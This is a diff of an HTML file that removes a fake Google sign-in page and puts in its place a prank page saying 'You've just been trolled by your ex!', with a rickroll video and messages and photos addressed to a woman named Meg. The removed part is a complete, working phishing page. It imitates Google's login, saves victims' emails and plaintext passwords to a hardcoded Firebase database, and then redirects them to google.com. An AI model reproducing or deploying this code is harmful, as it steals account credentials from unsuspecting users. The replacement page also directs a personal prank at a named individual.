@@ -1,139 +1,117 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Sign-In</title>
+    <title>Trolled by Your Ex</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #ffffff;
+        html, body {
+            height: 100%; /* Fiksna visina za celu stranicu */
             margin: 0;
             padding: 0;
         }
-        .container {
-            max-width: 360px;
-            margin: 80px auto;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            border: 1px solid #dadce0;
-        }
-        .logo {
-            width: 75px;
-            margin-bottom: 20px;
-            display: block;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        h2 {
-            font-size: 22px;
-            font-weight: 400;
-            color: #202124;
-            margin-bottom: 20px;
-        }
-        .input-field {
-            width: calc(100% - 20px);
-            padding: 14px;
-            margin: 10px 0;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            display: block;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        .btn {
-            width: 100%;
-            background: #1a73e8;
+        body {
+            background-color: black;
             color: white;
-            padding: 12px;
-            border: none;
-            border-radius: 4px;
-            font-size: 14px;
-            cursor: pointer;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            text-align: center;
+        }
+        h1 {
+			
+            font-size: 3em;
+            margin-bottom: 10px;
+            animation: shake 0.5s infinite;
+        }
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            50% { transform: translateX(5px); }
+            75% { transform: translateX(-5px); }
+            100% { transform: translateX(5px); }
+        }
+        .troll {
+            font-size: 4em;
+            margin:  0;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        .play-button {
             margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 1.2em;
+            background-color: red;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: background-color 0.3s;
         }
-        .btn:hover {
-            background: #1765c1;
+        .play-button:hover {
+            background-color: darkred;
         }
-        .links {
-            text-align: left;
-            font-size: 14px;
-            margin-top: 15px;
+        .love-message {
+            font-size: 2em;
+            color: red;
+            margin-top: 5px;
         }
-        .links a {
-            color: #1a73e8;
-            text-decoration: none;
+        .content-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 80%;
+            margin-top: 40px;
         }
-        .links a:hover {
-            text-decoration: underline;
+        .video-container {
+            margin: 0 20px;
         }
-        .footer {
-            font-size: 12px;
-            color: #5f6368;
-            margin-top: 25px;
+        .image-container {
+            display: flex;
+            justify-content: space-between;
+            width: 300px;
+        }
+        .image-container img {
+            width: 300px;
+            height: auto;
+            border-radius: 10px;
         }
     </style>
-
-    <!-- Firebase SDK -->
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
-        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-database.js";
-        
-        // Your Firebase configuration
-        const firebaseConfig = {
-            apiKey: "AIzaSyBayO5L4s7eGOpEy44PatKiC5NvlxCbWjI",
-            authDomain: "login-272dd.firebaseapp.com",
-            projectId: "login-272dd",
-            storageBucket: "login-272dd.firebasestorage.app",
-            messagingSenderId: "182642345585",
-            appId: "1:182642345585:web:7b9e7d0e4cf9ab156abdd0"
-        };
-
-        // Initialize Firebase
-        const app = initializeApp(firebaseConfig);
-        const database = getDatabase(app);
-
-        // Submit form data to Firebase
-        document.addEventListener("submit", function(event) {
-            event.preventDefault();  // Prevent form from refreshing page
-            
-            const email = document.querySelector("input[type='email']").value;
-            const password = document.querySelector("input[type='password']").value;
-            
-            // Save to Firebase Realtime Database
-            set(ref(database, 'users/' + email.replace(".", "_")), {
-                email: email,
-                password: password
-            }).then(() => {
-                console.log("Data saved successfully!");
-
-                // Redirect user to www.google.com after successful data submission
-                window.location.href = "https://www.google.com";
-            }).catch((error) => {
-                console.error("Error saving data:", error);
-            });
-        });
-    </script>
 </head>
 <body>
-    <div class="container">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google Logo">
-        <h2>Sign in</h2>
-        <form>
-            <input type="email" class="input-field" placeholder="Email or phone" required>
-            <input type="password" class="input-field" placeholder="Enter your password" required>
-            <div class="links">
-                <a href="#">Forgot password?</a>
-            </div>
-            <button type="submit" class="btn">Next</button>
-        </form>
-        <div class="links">
-            <p>Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
+    <h1>You’ve just been trolled by your ex!</h1>
+    <div class="troll">😈</div>
+    
+    <div class="content-container">
+        <div class="image-container">
+            <img src="meg1.jpg" alt="Meg1" />
         </div>
-        <p class="footer">© 2025 Google • <a href="#">Privacy</a> • <a href="#">Terms</a></p>
+        <div class="video-container">
+            <video id="rickroll-video" width="600" height="400" autoplay loop muted>
+                <source src="rick.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+            <button class="play-button" onclick="playVideo()">Play Sound</button>
+        </div>
+        <div class="image-container">
+            <img src="meg2.jpg" alt="Meg2" />
+        </div>
     </div>
+
+    <div class="love-message">I still think about you Meg ❤️❤️❤️</div>
+
+    <script>
+        function playVideo() {
+            var video = document.getElementById('rickroll-video');
+            video.muted = false;  // Unmute the video
+            video.play();  // Start playing the video with sound
+        }
+    </script>
 </body>
-</html>
+</html> 
